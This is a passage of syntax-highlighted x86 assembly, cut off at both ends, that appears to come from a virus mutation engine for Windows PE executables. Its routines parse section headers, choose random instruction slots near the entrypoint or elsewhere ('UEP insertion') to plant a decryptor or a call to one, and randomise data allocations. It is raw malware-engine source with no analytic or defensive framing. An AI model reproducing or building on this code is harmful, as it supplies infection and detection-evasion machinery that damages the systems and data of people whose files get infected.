</span><span class="sc5">var_alloc_3</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buf_ptr</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">

                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; input: ESI=id, EDX=min size</span><span class="sc0">

</span><span class="sc5">var_alloc_2</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_hooy_data</span><span class="sc0">

                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush_label</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__skiprnd</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
</span><span class="sc5">__skiprnd</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">buf_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_DATA</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_VPRESENT</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">flush</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; input:  ECX=size</span><span class="sc0">
</span><span class="sc1">; output: EAX=ptr</span><span class="sc0">

</span><span class="sc5">malloc</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">user_param</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_malloc</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">mutate_error</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; popa.eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">random</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">user_param</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">user_random</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; popa.eax</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">rndb</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">254</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">rnd_dword</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rndb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rndb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rndb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rndb</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">find_hooy</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">pusha</span><span class="sc0">

</span><span class="sc1">; count # of good entries</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; count</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">

</span><span class="sc5">__cycle1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_STOP</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cont1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_FIXUP</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cont1</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; count++</span><span class="sc0">

</span><span class="sc5">__cont1</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle1</span><span class="sc0">

</span><span class="sc1">; check if no good entries available</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">mutate_error</span><span class="sc0">

</span><span class="sc1">; select random entry</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; seek selected entry</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">

</span><span class="sc5">__cycle2</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_STOP</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cont2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_FIXUP</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cont2</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; count++</span><span class="sc0">
                        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">__done</span><span class="sc0">

</span><span class="sc5">__cont2</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle2</span><span class="sc0">
</span><span class="sc5">__done</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">find_hooy_data</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc1">;;</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">oe</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc5">.pe_numofobjects</span><span class="sc0">

</span><span class="sc5">__ccc</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.oe_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0000040h</span><span class="sc0">  </span><span class="sc1">; seek .data</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__ddd</span><span class="sc0">

                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">        </span><span class="sc1">; oe</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__ccc</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mutate_error</span><span class="sc0">

</span><span class="sc5">__ddd</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.oe_virt_size</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__eee</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.oe_phys_size</span><span class="sc0">
</span><span class="sc5">__eee</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.oe_virt_rva</span><span class="sc0">
                        </span><span class="sc1">;;</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">__cnt</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_SECTALIGN</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cnt</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__cnt</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mutate_error</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; action: find entry near the entrypoint, to insert decryptor or</span><span class="sc0">
</span><span class="sc1">; &lt;call/jmp decryptor&gt; into</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; with some prob, we're ignoring entrypoint and performing UEP insertion</span><span class="sc0">

</span><span class="sc5">find_special_hooy</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@uep</span><span class="sc0">

                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; 0/1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">
</span><span class="sc5">@@cycle1</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@x1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pe</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.pe_entrypointrva</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_oldrva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@x1</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x1</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">@@x1</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x2</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@x2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_HAVEREL</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FL_FIXUP</span><span class="sc0"> </span><span class="sc1">; will fail on ADC/SBB</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@x2</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_STOP</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@x3</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@4</span><span class="sc0">

</span><span class="sc5">@@x2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@cycle1</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">mutate_error</span><span class="sc0">
</span><span class="sc5">@@x3</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">hooy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                        </span><span class="sc6">popa</span><span class="sc0">
                        </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">@@uep</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; count</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">

</span><span class="sc5">__cycle1</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cont1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cont1</span><span class="sc0">

                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; count++</span><span class="sc0">

</span><span class="sc5">__cont1</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">__cycle1</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">mutate_error</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">root</span><span class="sc0">

</span><span class="sc5">__cycle2</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cont2</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc5">.h_flags</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FL_OPCODE</span><span class="sc0">
                        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">__cont2</span><span class="sc0">

                        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; count++</span><span class="sc0">
                        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">__done</span><span class="sc0">

</span><span class="sc5">__cont2</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.h_next</span><span class="sc0">
                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
